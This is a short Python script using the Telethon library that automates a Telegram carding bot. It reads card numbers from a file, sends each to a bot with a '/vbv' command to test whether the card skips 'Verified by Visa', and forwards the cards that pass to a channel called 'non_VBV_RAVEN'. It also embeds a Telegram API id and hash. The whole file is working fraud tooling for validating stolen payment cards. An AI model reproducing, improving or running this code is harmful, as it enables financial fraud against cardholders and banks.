from telethon.sync import TelegramClient, events
import time

api_id = '21256594'
api_hash = '34b4ae3055e20c42951864422e552273'
done = 0
total_cc_count = sum(1 for line in open('cc.txt'))

destination = 'https://t.me/non_VBV_RAVEN'  # Replace with the actual group ID or Telegram user ID

client = TelegramClient('session_name', api_id, api_hash)
client.start()

@client.on(events.NewMessage(from_users='SDBB_Bot'))
@client.on(events.MessageEdited(from_users='SDBB_Bot'))
async def handle_message(event):
    global done
    if 'wait' in event.message.text or 'Waiting' in event.message.text:
        return

    done += 1
    cc_response = event.message.text.replace("`", "")
    if cc_response.strip() and '𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱' not in cc_response and '𝗣𝗮𝘀𝘀𝗲𝗱' in cc_response:
        await client.send_message(destination, cc_response)

    if done == total_cc_count:
        await client.send_message(destination, 'Processing complete!')

async def send_message_to_bot(cc, destination):
    await client.send_message('SDBB_Bot', f'/vbv {cc}')
    time.sleep(5)  # Delay of 5 seconds

async def main():
    with open('cc.txt', 'r') as file:
        for line in file:
            cc = line.strip()
            await send_message_to_bot(cc, destination)
            if done == total_cc_count:
                break

with client:
    client.loop.run_until_complete(main())
    client.run_until_disconnected()
